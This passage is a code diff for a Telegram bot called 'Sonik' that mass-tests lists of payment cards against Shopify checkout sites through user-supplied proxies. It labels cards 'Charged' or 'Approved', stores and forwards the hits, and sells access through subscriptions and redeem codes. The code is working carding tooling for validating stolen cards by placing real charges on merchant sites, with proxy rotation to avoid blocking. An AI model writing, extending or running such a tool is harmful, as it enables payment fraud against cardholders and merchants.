+💡 <i>{bs('For unlimited admin access, set hours=0')}</i>""", emoji_ids=[CE["info"]])
+
+    try:
+
+        target_uid = int(parts[1])
+
+        hours = int(parts[2])
+
+        await ensure_user(target_uid)
+
+        if hours > 0:
+
+            await set_user_subscription(target_uid, "admin_gift", hours)
+
+            await styled_reply(event, f"""🎁 <b>{bs('Subscription Given')}</b> 🎁
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+👤 <b>{bs('User')}:</b> <code>{target_uid}</code>
+
+⏰ <b>{bs('Duration')}:</b> <code>{hours} hours</code>""", emoji_ids=[CE["check"], CE["check"], CE["star"], CE["gem"]])
+
+            try:
+
+                await styled_send(target_uid, f"""🎁 <b>{bs('Admin Gave You a Subscription!')}</b> 🎁
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+⏰ <b>{bs('Duration')}:</b> <code>{hours} hours</code>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+📝 <code>/start</code> {bs('to use Sonik')}""", emoji_ids=[CE["gift"], CE["gift"], CE["star"], CE["info"]])
+
+            except:
+
+                pass
+
+        else:
+
+            await db["users"].update_one({"user_id": target_uid}, {"$set": {"subscription_plan": "unlimited", "subscription_end": None}})
+
+            await styled_reply(event, f"""👑 <b>{bs('Unlimited Access Given')}</b> 👑
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+👤 <b>{bs('User')}:</b> <code>{target_uid}</code>""", emoji_ids=[CE["crown"], CE["crown"], CE["check"]])
+
+    except Exception as e:
+
+        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]resetsites$'))
+
+async def reset_sites_cmd(event):
+
+    if event.sender_id not in ADMIN_ID:
+
+        return
+
+    await clear_all_global_sites()
+
+    await styled_reply(event, f"🔄 <b>{bs('All sites have been cleared')}</b>\n➕ <i>{bs('Use /add to add new sites')}</i>", emoji_ids=[CE["check"], CE["info"]])
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]stats$'))
+
+async def stats_cmd(event):
+
+    if event.sender_id not in ADMIN_ID:
+
+        return
+
+    try:
+
+        tu = await get_total_users()
+
+        pu = await get_premium_count()
+
+        tc = await get_total_cards_count()
+
+        ch = await get_charged_count()
+
+        ap = await get_approved_count()
+
+        sites_count = await get_total_sites_count()
+
+        
+
+        total_codes = await db["codes"].count_documents({})
+
+        used_codes = await db["codes"].count_documents({"used": True})
+
+        
+
+        await styled_reply(event, f"""📊 <b>{bs('Sonik Statistics')}</b> 📊
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+👥 <b>{bs('Users')}:</b> <code>{tu}</code>
+
+✅ <b>{bs('Subscribed')}:</b> <code>{pu}</code>
+
+💳 <b>{bs('Cards Checked')}:</b> <code>{tc}</code>
+
+🔥 <b>{bs('Charged')}:</b> <code>{ch}</code>
+
+✅ <b>{bs('Approved')}:</b> <code>{ap}</code>
+
+🌐 <b>{bs('Sites')}:</b> <code>{sites_count}</code>
+
+🎁 <b>{bs('Codes Generated')}:</b> <code>{total_codes}</code>
+
+✅ <b>{bs('Codes Used')}:</b> <code>{used_codes}</code>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+⚡ <b>{bs('MSP Active')}:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code> ({MSP_PER_USER_WORKERS}w)""", emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"], CE["star"], CE["brain"], CE["shield"]])
+
+    except Exception as e:
+
+        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
+
+
+
+# ====================== /stop ======================
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]stop$'))
+
+async def stop_cmd(event):
+
+    uid = event.sender_id
+
+    proc = ACTIVE_MTXT_PROCESSES.get(uid)
+
+    if proc and isinstance(proc, dict):
+
+        proc["stopped"] = True
+
+        for task in proc.get("tasks", []):
+
+            if not task.done():
+
+                task.cancel()
+
+        await styled_reply(event, f"⛔ <b>{bs('Stopping process...')}</b>", emoji_ids=[CE["stop"]])
+
+    else:
+
+        await styled_reply(event, f"⚠️ <b>{bs('No active process')}</b>", emoji_ids=[CE["warn"]])
+
+
+
+# ====================== MASS CHECK ======================
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]msp\b'))
+
+async def mass_check_cmd(event):
+
+    if await check_maintenance(event):
+
+        return
+
+    if not await force_join_check(event):
+
+        return
+
+    if await is_banned_user(event.sender_id):
+
+        t, e = banned_user_message()
+
+        return await styled_reply(event, t, emoji_ids=e)
+
+    uid = event.sender_id
+
+    if uid not in ADMIN_ID and not await is_user_subscribed(uid):
+
+        return await send_no_subscription_message(event)
+
+    await update_last_seen(uid)
+
+    if uid in ACTIVE_MTXT_PROCESSES:
+
+        proc = ACTIVE_MTXT_PROCESSES.get(uid)
+
+        if proc and not proc.get("stopped", True):
+
+            return await styled_reply(event, f"⚠️ <b>{bs('You already have an active process')}</b>\n⛔ {bs('Use /stop to cancel it first')}", emoji_ids=[CE["warn"]])
+
+    sites = await get_global_sites()
+
+    if not sites:
+
+        return await styled_reply(event, f"⚠️ <b>{bs('No sites available. Admin please add sites.')}</b>", emoji_ids=[CE["warn"]])
+
+    
+
+    proxies = await get_all_user_proxies(uid)
+
+    
+
+    # ===== PROXY REQUIRED =====
+
+    if not proxies:
+
+        return await styled_reply(event, f"""🛡️ <b>{bs('No Proxies Found')}</b> 🛡️
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+⚠️ <b>{bs('You must add proxies first')}</b>
+
+💡 <i>{bs('Use /addpxy to add proxies')}</i>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+📝 <code>/addpxy ip:port:user:pass</code>
+
+💡 <i>{bs('Then try /msp again')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["link"], CE["info"]])
+
+    
+
+    content = ""
+
+    cmd_text = re.sub(r'^[/.]msp\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
+
+    if cmd_text:
+
+        content = cmd_text
+
+        from_inline = True
+
+    elif event.reply_to_msg_id:
+
+        rm = await event.get_reply_message()
+
+        if not rm:
+
+            return await styled_reply(event, f"⚠️ <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
+
+        if rm.document:
+
+            fp = await rm.download_media()
+
+            try:
+
+                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+
+                    content = await f.read()
+
+                os.remove(fp)
+
+            except:
+
+                pass
+
+        elif rm.text:
+
+            content = rm.text
+
+        from_inline = True
+
+    else:
+
+        from_inline = False
+
+    cards = extract_cc(content)
+
+    if not cards:
+
+        if from_inline:
+
+            return await styled_reply(event, f"⚠️ <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
+
+        else:
+
+            return await styled_reply(event, f"📝 <b>{bs('Reply to .txt or paste cards after')} </b><code>/msp</code>", emoji_ids=[CE["info"]])
+
+    if uid not in ADMIN_ID and len(cards) > MAX_CARDS_MASS:
+
+        cards = cards[:MAX_CARDS_MASS]
+
+        await styled_reply(event, f"⚠️ <b>{bs('Limited to')} {MAX_CARDS_MASS} {bs('cards for non-admin users')}</b>", emoji_ids=[CE["warn"]])
+
+    elif len(cards) > 10000 and uid in ADMIN_ID:
+
+        cards = cards[:10000]
+
+        await styled_reply(event, f"⚠️ <b>{bs('Limited to 10000 cards per check')}</b>", emoji_ids=[CE["warn"]])
+
+    kb = [
+        [pbtn(f"❤️‍🔥 {bs('CHARGED ONLY')}", f"mass_filter:charged:{uid}", style="danger")],
+        [pbtn(f"✅ {bs('APPROVED ONLY')}", f"mass_filter:approved:{uid}", style="success")],
+        [pbtn(f"⚡️ {bs('BOTH (CHARGED + APPROVED)')}", f"mass_filter:both:{uid}", style="primary")]
+    ]
+    pm = await styled_reply(event, f"""📊 <b>{bs('MASS CHECKER CONFIG')}</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+📋 <b>{bs('Cards Loaded')}:</b> <code>{len(cards)}</code>
+💡 <i>{bs('Choose which results you want to receive in chat')}</i>
+<b>━━━━━━━━━━━━━━━━━</b>
+𝗗𝗲𝘃 → sonik""", buttons=kb, emoji_ids=[CE["chart"], CE["fire"]])
+    USER_APPROVED_PREF[f"mass_{uid}"] = {"cards": cards, "sites": sites, "proxies": proxies, "event": event, "pref_msg": pm, "rotator": SmartRotator()}
+
+
+
+@client.on(events.CallbackQuery(pattern=rb"mass_filter:(charged|approved|both):(\d+)"))
+
+async def mass_filter_cb(event):
+
+    filter_type = event.pattern_match.group(1).decode()
+
+    uid = int(event.pattern_match.group(2).decode())
+
+    if event.sender_id != uid:
+
+        return await event.answer(f"🚫 {bs('Not yours')}!", alert=True)
+
+    data = USER_APPROVED_PREF.pop(f"mass_{uid}", None)
+
+    if not data:
+
+        return await event.answer(f"⏰ {bs('Expired')}!", alert=True)
+
+    try:
+
+        await data["pref_msg"].delete()
+
+    except:
+
+        pass
+
+    if uid in ACTIVE_MTXT_PROCESSES:
+
+        return await event.answer(f"⚠️ {bs('Already running')}!", alert=True)
+
+    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
+
+    await event.answer(f"🚀 {bs('Starting')}...")
+
+    rotator = data.get("rotator", SmartRotator())
+
+    sites, proxies = data["sites"], data["proxies"]
+
+    send_approved = filter_type in ["approved", "both"]
+
+    async def shopify_check(card, http_session):
+
+        result = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
+
+        return result
+
+    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, send_approved, ACTIVE_MTXT_PROCESSES, "stop_mass", shopify_check, "Shopify", "msp", filter_type))
+
+
+
+@client.on(events.CallbackQuery(pattern=rb"stop_mass:(\d+)"))
+
+async def stop_mass_cb(event):
+
+    puid = int(event.pattern_match.group(1).decode())
+
+    if event.sender_id != puid and event.sender_id not in ADMIN_ID:
+
+        return await event.answer(f"🚫 {bs('Not yours')}!", alert=True)
+
+    proc = ACTIVE_MTXT_PROCESSES.get(puid)
+
+    if not proc:
+
+        return await event.answer(f"⚠️ {bs('None active')}!", alert=True)
+
+    if isinstance(proc, dict):
+
+        proc["stopped"] = True
+
+        for t in proc.get("tasks", []):
+
+            if not t.done():
+
+                t.cancel()
+
+    await event.answer(f"⛔ {bs('Stopping')}...", alert=True)
+
+
+
+# ====================== GENERIC MASS PROCESSOR ======================
+
+async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type, filter_type="both"):
+
+    uid = event.sender_id
+
+    
+
+    user_check = await db["users"].find_one({"user_id": uid})
+
+    if user_check and user_check.get("banned", False):
+
+        process_store[uid] = {"stopped": True}
+
+        await styled_reply(event, f"🚫 <b>{bs('You are banned. Process stopped.')}</b>", emoji_ids=[CE["stop"]])
+
+        return
+
+    
+
+    try:
+
+        sender = await event.get_sender()
+
+        username = sender.username or f"user_{uid}"
+
+        name = sender.first_name or "User"
+
+    except:
+
+        username, name = f"user_{uid}", "User"
+
+    
+
+    total = len(cards)
+
+    checked = charged = approved = declined = errors = 0
+
+    st = time.time()
+
+    hits = []
+
+    workers = MSP_PER_USER_WORKERS
+
+    user_sem = get_user_sem(uid, sem_type)
+
+    http_session = await get_user_http_session(uid, sem_type)
+
+    sm = await styled_reply(event, f"⚡ <b>{bs('Processing')} ━ {gate_name} ━ {workers}{bs('w')}</b>", emoji_ids=[CE["chart"]])
+
+    last_ui = [0]
+
+    lcd, lrd = "-", "-"
+
+    
+
+    def is_stopped():
+
+        proc = process_store.get(uid)
+
+        if not proc:
+
+            return True
+
+        return proc.get("stopped", False) if isinstance(proc, dict) else False
+
+    
+
+    async def check_banned_async():
+
+        user_check2 = await db["users"].find_one({"user_id": uid})
+
+        if user_check2 and user_check2.get("banned", False):
+
+            proc = process_store.get(uid)
+
+            if proc and isinstance(proc, dict):
+
+                proc["stopped"] = True
+
+            return True
+
+        return False
+
+    
+
+    async def update_ui():
+        nonlocal last_ui
+        now = time.time()
+        if now - last_ui[0] < 3.0 or is_stopped():
+            return
+        if await check_banned_async():
+            return
+        last_ui[0] = now
+        kb = [
+            [pbtn(f"💳 {lcd}", "none", style="primary")],
+            [pbtn(f"📝 {lrd}", "none", style="primary")],
+            [pbtn(f"❤️‍🔥 {bs('CHARGED')} ━ {charged}", "none", style="danger")],
+            [pbtn(f"✅ {bs('APPROVED')} ━ {approved}", "none", style="success")],
+            [pbtn(f"❌ {bs('DECLINED')} ━ {declined}", "none", style="danger"), pbtn(f"⚠️ {bs('ERROR')} ━ {errors}", "none", style="danger")],
+            [pbtn(f"📋 {checked} / {total}", "none", style="primary")],
+            [pbtn(f"⛔ {bs('STOP PROCESS')}", f"{stop_prefix}:{uid}", style="danger")]
+        ]
+        try:
+            await styled_edit(sm, f"⚡️ <b>{bs('MASS CHECKING IN PROGRESS')}</b> ⚡️\n<b>━━━━━━━━━━━━━━━━━</b>\n⏳ <b>{bs('Elapsed')}:</b> <code>{int(time.time()-st)}s</code>\n<b>━━━━━━━━━━━━━━━━━</b>", buttons=kb, emoji_ids=[CE["chart"]])
+        except:
+            pass
+    
+
+    async def worker(card):
+
+        nonlocal checked, charged, approved, declined, errors, lcd, lrd
+
+        if is_stopped():
+
+            return
+
+        if await check_banned_async():
+
+            return
+
+        async with user_sem:
+
+            if is_stopped():
+
+                return
+
+            try:
+
+                result = await check_func(card, http_session)
+
+                if is_stopped():
+
+                    return
+
+                status = result.get("Status", "Declined")
+
+                resp = result.get("Response", "")
+
+                gw = result.get("Gateway", gate_name)
+
+                checked += 1
+
+                lcd = card
+
+                lrd = resp[:30]
+
+                if status == "Error":
+
+                    errors += 1
+
+                elif status == "Charged":
+
+                    charged += 1
+
+                    hits.append(f"{card} - CHARGED - {resp} - {gw}")
+
+                    asyncio.create_task(save_card_to_db(card, "CHARGED", resp, gw, result.get('Price', '-')))
+
+                    asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name))
+
+                elif status == "Approved":
+
+                    approved += 1
+
+                    hits.append(f"{card} - APPROVED - {resp} - {gw}")
+
+                    asyncio.create_task(save_card_to_db(card, "APPROVED", resp, gw, result.get('Price', '-')))
+
+                    if send_approved:
+
+                        asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name))
+
+                else:
+
+                    declined += 1
+
+                await update_ui()
+
+            except asyncio.CancelledError:
+
+                return
+
+            except:
+
+                if not is_stopped():
+
+                    errors += 1
+
+                    checked += 1
+
+    
+
+    batch_size = workers * 2
+
+    all_tasks = []
+
+    proc = process_store.get(uid)
+
+    for i in range(0, len(cards), batch_size):
+
+        if is_stopped():
+
+            break
+
+        if await check_banned_async():
+
+            break
+
+        batch_tasks = [asyncio.create_task(worker(c)) for c in cards[i:i+batch_size]]
+
+        all_tasks.extend(batch_tasks)
+
+        if isinstance(proc, dict):
+
+            proc["tasks"] = all_tasks
+
+        await asyncio.gather(*batch_tasks, return_exceptions=True)
+
+    
+
+    await asyncio.sleep(0.3)
+
+    el = int(time.time() - st)
+
+    h, m, s = el // 3600, (el % 3600) // 60, el % 60
+
+    stop_label = f" ({bs('Stopped')})" if is_stopped() else ""
+
+    
+
+    ft = f"""✅ <b>{bs('Complete')}{stop_label}</b> ✅
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+🔥 <b>{bs('Charged')}</b> ━ <code>{charged}</code>
+
+✅ <b>{bs('Approved')}</b> ━ <code>{approved}</code>
+
+❌ <b>{bs('Declined')}</b> ━ <code>{declined}</code>
+
+⚠️ <b>{bs('Errors')}</b> ━ <code>{errors}</code>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+📋 <b>{bs('Checked')}</b> ━ <code>{checked}/{total}</code>"""
+
+    
+
+    fkb = [
+
+        [pbtn(f"🔥 {bs('C')} ━ {charged}", "none"), pbtn(f"✅ {bs('A')} ━ {approved}", "none")],
+
+        [pbtn(f"📋 {bs('T')} ━ {checked}/{total}", "none"), pbtn(f"⏱️ {h}{bs('h')}{m}{bs('m')}{s}{bs('s')}", "none")]
+
+    ]
+
+    
+
+    for _ in range(3):
+
+        try:
+
+            await styled_edit(sm, ft, buttons=fkb, emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["check"], CE["declined"], CE["warn"], CE["star"]])
+
+            break
+
+        except:
+
+            await asyncio.sleep(0.5)
+
+    
+
+    await send_final_file(uid, charged, approved, declined, errors, total, hits, uid)
+
+    process_store.pop(uid, None)
+
+    await cleanup_user_http_session(uid, sem_type)
+
+    cleanup_user_sem(uid)
+
+
+
+async def _send_mass_hit(card, result, status, uid, username, name):
+
+    await asyncio.sleep(HIT_DELAY)
+
+    try:
+
+        bi = await get_bin_info(card.split("|")[0])
+
+        gw = result.get('Gateway', 'Shopify')
+
+        resp = result.get('Response', '')[:150]
+
+        msg, eid = format_card_result(status, card, gw, resp, result.get('Price', '-'), result.get('site', '-'), bi, 0.0)
+
+        try:
+
+            HIT_BUTTON = [[Button.url("🚀 " + bs("Sonik"), f"https://t.me/{MAIN_BOT_USERNAME}")]]
+
+            await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
+
+        except:
+
+            pass
+
+        if status in ["Charged", "Approved"]:
+
+            asyncio.create_task(send_channel_hit(result, uid, username, name))
+
+    except:
+
+        pass
+
+
+
+async def send_final_file(uid, charged, approved, declined, errors, total, hits=None, target_chat=None):
+
+    hits = hits or []
+
+    fn = f"sonik_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+
+    target = target_chat or uid
+
+    try:
+
+        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
+
+            await f.write(f"{'='*49}\nSONIK RESULTS\n{'='*49}\n\nCharged: {charged}\nApproved: {approved}\nDeclined: {declined}\nErrors: {errors}\nTotal: {total}\n")
+
+            if hits:
+
+                await f.write(f"\n{'='*49}\nHITS\n{'='*49}\n\n")
+
+                for h in hits:
+
+                    await f.write(h + "\n")
+
+        try:
+
+            await styled_send(target, f"📊 <b>{bs('Results')}</b> 📊", emoji_ids=[CE["fire"], CE["fire"]], file=fn)
+
+        except:
+
+            pass
+
+        try:
+
+            os.remove(fn)
+
+        except:
+
+            pass
+
+    except:
+
+        pass
+
+
+
+# ====================== TASKS ======================
+
+async def cleanup_expired_loop():
+
+    while True:
+
+        try:
+
+            count = await cleanup_expired_subscriptions()
+
+            if count > 0:
+
+                log_system("CLEANUP", f"Cleaned {count} expired subscriptions")
+
+            
+
+            expired_codes = await db["codes"].delete_many({
+
+                "expires_at": {"$lt": datetime.now(timezone.utc)},
+
+                "used": False
+
+            })
+
+            if expired_codes.deleted_count > 0:
+
+                log_system("CLEANUP", f"Cleaned {expired_codes.deleted_count} expired codes")
+
+            
+
+            global _BIN_CACHE, _BIN_CACHE_TIME
+
+            now = time.time()
+
+            keys_to_remove = []
+
+            for key, cache_time in _BIN_CACHE_TIME.items():
+
+                if now - cache_time > _BIN_CACHE_TTL * 2:
+
+                    keys_to_remove.append(key)
+
+            for key in keys_to_remove:
+
+                _BIN_CACHE.pop(key, None)
+
+                _BIN_CACHE_TIME.pop(key, None)
+
+            if keys_to_remove:
+
+                log_system("CLEANUP", f"Cleaned {len(keys_to_remove)} BIN cache entries")
+
+            
+
+        except Exception as e:
+
+            log_system("CLEANUP", f"Error: {e}", "error")
+
+        await asyncio.sleep(3600)
+
+
+
+# ====================== INLINE MENU HANDLERS ======================
+
+@client.on(events.CallbackQuery(data=b"menu_checker"))
+async def menu_checker_handler(event):
+    await event.answer("⌛ Loading...")
+    text = f"""{gemj('fire_premium')} <b>{bs('CHECKER MENU')}</b> {gemj('heart_fire')}
+<b>━━━━━━━━━━━━━━━━━</b>
+{gemj('wine')} <b>{bs('Shopify Checker')}</b>
+│  {gemj('cool')} <code>/sp cc|mm|yy|cvv</code>  ━  <b>{bs('Single CC')}</b>
+│  {gemj('sled')} <code>/msp</code> (reply to list)  ━  <b>{bs('Mass CC')}</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+{gemj('diamond')} 𝗗𝗲𝘃 → sonik"""
+    await styled_edit(event, text, buttons=[[Button.inline("🔙 Back", data="back_to_start", style="danger")]])
+
+
+@client.on(events.CallbackQuery(data=b"menu_sites"))
+async def menu_sites_handler(event):
+    await event.answer("⌛ Loading...")
+    text = f"""{gemj('diamond')} <b>{bs('SITES CONTROL')}</b> {gemj('diamond')}
+<b>━━━━━━━━━━━━━━━━━</b>
+│  ➕ <code>/add url</code>  ━  <b>{bs('Add sites')}</b>
+│  ➖ <code>/rm url</code>  ━  <b>{bs('Remove site')}</b>
+│  📋 <code>/sites</code>  ━  <b>{bs('View all sites')}</b>
+│  🔍 <code>/site</code>  ━  <b>{bs('Test all sites')}</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+{gemj('snowman')} 𝗗𝗲𝘃 → sonik"""
+    await styled_edit(event, text, buttons=[[Button.inline("🔙 Back", data="back_to_start", style="danger")]])
+
+
+@client.on(events.CallbackQuery(data=b"menu_proxy"))
+async def menu_proxy_handler(event):
+    await event.answer("⌛ Loading...")
+    text = f"""{gemj('sled')} <b>{bs('PROXY CONTROL')}</b> {gemj('sled')}
+<b>━━━━━━━━━━━━━━━━━</b>
+│  ➕ <code>/addpxy proxy</code>  ━  <b>{bs('Add proxy')}</b>
+│  📋 <code>/proxy</code>  ━  <b>{bs('View proxies')}</b>
+│  🔍 <code>/chkpxy</code>  ━  <b>{bs('Test proxies')}</b>
+│  ➖ <code>/rmpxy</code>  ━  <b>{bs('Remove all')}</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+{gemj('wine')} 𝗗𝗲𝘃 → sonik"""
+    await styled_edit(event, text, buttons=[[Button.inline("🔙 Back", data="back_to_start", style="danger")]])
+
+
+@client.on(events.CallbackQuery(data=b"menu_account"))
+async def menu_account_handler(event):
+    await event.answer("⌛ Loading...")
+    uid = event.sender_id
+    sub = await get_user_subscription(uid)
+    access = "OWNER" if uid in ADMIN_ID else (sub["plan"].upper() if sub["is_active"] else "TRIAL")
+    text = f"""{gemj('cool')} <b>{bs('MY ACCOUNT')}</b> {gemj('cool')}
+<b>━━━━━━━━━━━━━━━━━</b>
+{gemj('fire_premium')} <b>{bs('User')}:</b> <code>{uid}</code>
+{gemj('heart_fire')} <b>{bs('Access')}:</b> <b>{access}</b>
+{gemj('diamond')} <code>/redeem code</code>  ━  <b>{bs('Redeem Code')}</b>
+{gemj('wine')} <code>/info</code>  ━  <b>{bs('Full Stats')}</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+{gemj('snowman')} 𝗗𝗲𝘃 → sonik"""
+    await styled_edit(event, text, buttons=[[Button.inline("🔙 Back", data="back_to_start", style="danger")]])
+
+
+@client.on(events.CallbackQuery(data=b"menu_admin"))
+async def menu_admin_handler(event):
+    uid = event.sender_id
+    if uid not in ADMIN_ID:
+        return await event.answer("🚫 Admin only!", alert=True)
+    await event.answer("⌛ Loading...")
+    text = f"""{gemj('snowman')} <b>{bs('ADMIN PANEL')}</b> {gemj('snowman')}
+<b>━━━━━━━━━━━━━━━━━</b>
+│  {gemj('fire_premium')} <code>/code hours</code>  ━  <b>{bs('Gen Code')}</b>
+│  {gemj('heart_fire')} <code>/ban id</code>  ━  <b>{bs('Block user')}</b>
+│  {gemj('diamond')} <code>/broadcast</code>  ━  <b>{bs('Global Msg')}</b>
+│  {gemj('wine')} <code>/maintenance</code>  ━  <b>{bs('Toggle')}</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+{gemj('cool')} 𝗗𝗲𝘃 → sonik"""
+    await styled_edit(event, text, buttons=[[Button.inline("🔙 Back", data="back_to_start", style="danger")]])
+
+
+@client.on(events.CallbackQuery(data=b"back_to_start"))
+
+async def back_to_start_handler(event):
+
+    await event.answer("🔙 Returning...")
+
+    try:
+
+        await event.delete()
+
+    except:
+
+        pass
+
+    await start(event)
+
+
+
+# ====================== MAIN ======================
+
+async def fetch_premium_emojis():
+    """Fetch custom emoji IDs from the specified pack to ensure they work"""
+    global CE
+    try:
+        from telethon.tl.functions.messages import GetStickerSetRequest
+        from telethon.tl.types import InputStickerSetShortName
+        
+        # The pack provided by the user
+        pack_short_name = "sticks_27356_by_TgEmojis_bot"
+        sticker_set = await client(GetStickerSetRequest(
+            stickerset=InputStickerSetShortName(short_name=pack_short_name),
+            hash=0
+        ))
+        
+        if sticker_set and sticker_set.documents:
+            # Map emojis from the pack to our CE keys
+            docs = sticker_set.documents
+            num_docs = len(docs)
+            
+            # Update CE with actual IDs from the pack
+            keys = ["fire_premium", "heart_fire", "cool", "sled", "wine", "diamond", "snowman", "crown", "bolt", "star", "gem"]
+            for i, key in enumerate(keys):
+                if i < num_docs:
+                    CE[key] = docs[i].id
+            
+            log_system("BOOT", f" ✅ Successfully loaded {min(num_docs, len(keys))} premium emojis from pack!")
+    except Exception as e:
+        log_system("BOOT", f" ⚠️ Could not fetch premium emojis: {e}", "warning")
+
+async def main():
+
+    global MAIN_BOT_USERNAME, client_instance
+
+    log_system("BOOT", "Initializing database...")
+
+    await init_db()
+
+    
+
+    try:
+
+        await db["codes"].create_index("code", unique=True)
+
+        await db["codes"].create_index("expires_at")
+
+        await db["codes"].create_index("used")
+
+    except:
+
+        pass
+
+    
+
+    log_system("BOOT", "Starting cleanup loop...")
+
+    asyncio.create_task(cleanup_expired_loop())
+
+    while True:
+
+        try:
+
+            log_system("BOOT", "Starting bot...")
+
+            await client.start(bot_token=BOT_TOKEN)
+            
+            # Fetch premium emojis from the pack provided by user
+            await fetch_premium_emojis()
+
+            me = await client.get_me()
+
+            MAIN_BOT_USERNAME = me.username
+
+            client_instance = client
+
+            log_system("BOOT", f"✅ Sonik Bot (@{MAIN_BOT_USERNAME}) started!")
+
+            log_system("BOOT", "✅ Enhanced features: Only accepted responses (3DS_REQUIRED, INSUFFICIENT_FUNDS, CARD_DECLINED, ORDER_PAID, CHARGED, PAYMENT_SUCCESSFUL)")
+
+            log_system("BOOT", "✅ Rejected responses: empty submit, no valid payment, cart failed, checkout token errors")
+
+            log_system("BOOT", "✅ Price filtering from 0.01 USD")
+
+            log_system("BOOT", "✅ 3ds_required classified as Approved")
+
+            log_system("BOOT", "✅ Code system enabled: /code and /redeem")
+
+            log_system("BOOT", "✅ Proxy required for /sp and /msp")
+
+            log_system("BOOT", "✅ High load support with reduced workers")
+
+            log_system("BOOT", "✅ Rejected gateways: Authorize.Net, Checkout.com, Stripe Card Payments")
+
+            await client.run_until_disconnected()
+
+        except FloodWaitError as e:
+
+            log_system("FLOOD", f"Sleeping {e.seconds+5}s", "warning")
+
+            await asyncio.sleep(e.seconds + 5)
+
+        except Exception as e:
+
+            log_system("CRASH", f"{e}", "error")
+
+            await asyncio.sleep(10)
+
 
 
 if __name__ == "__main__":
-    _print_banner()
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\nInterrupted by user, exiting.")
+
+    asyncio.run(main())
